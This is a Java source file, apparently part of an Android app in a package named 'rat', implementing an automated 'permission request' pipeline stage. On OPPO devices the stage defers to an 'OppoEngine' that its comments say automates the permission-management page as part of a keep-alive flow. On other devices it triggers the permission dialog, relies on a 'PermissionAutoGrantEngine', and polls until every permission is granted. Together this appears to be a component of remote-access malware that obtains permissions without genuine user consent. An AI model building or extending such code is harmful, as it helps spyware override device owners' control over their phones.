package com.vendor.rat.auto.pipeline.stage;

import android.util.Log;

import com.vendor.rat.activity.ActivMain;
import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;

/**
 * Stage 7: 请求运行时权限
 *
 * 策略:
 *   - OPPO: 跳过 — 权限已在 OppoEngine.handlePermissionManagement() 中处理
 *   - 其他设备: requestPermissions() + PermissionAutoGrantEngine 被动监听
 */
public class PermissionRequestStage implements PipelineStage {

    private static final String TAG = "PermissionRequestStage";
    private static final long TIMEOUT_MS = 60_000;

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        if (passable.isOppo()) {
            // OPPO: 权限已在 OppoEngine 保活流程中通过权限管理页面自动化处理
            Log.d(TAG, "OPPO: skip (handled by OppoEngine.handlePermissionManagement)");
            passable.setPermissionsGranted(ActivMain.allPermissionsGranted());
            next.run();
            return;
        }

        // 其他设备: 标准 PermissionController 弹窗流程
        if (ActivMain.allPermissionsGranted()) {
            next.run();
            return;
        }

        Thread.interrupted();
        ActivMain.triggerPermissionRequest();
        Log.d(TAG, "Standard: permission request triggered");

        long polls = TIMEOUT_MS / 500;
        for (int i = 0; i < polls; i++) {
            if (ActivMain.allPermissionsGranted()) {
                Log.d(TAG, "Standard: all permissions granted");
                break;
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
        }

        passable.setPermissionsGranted(ActivMain.allPermissionsGranted());
        next.run();
    }
}
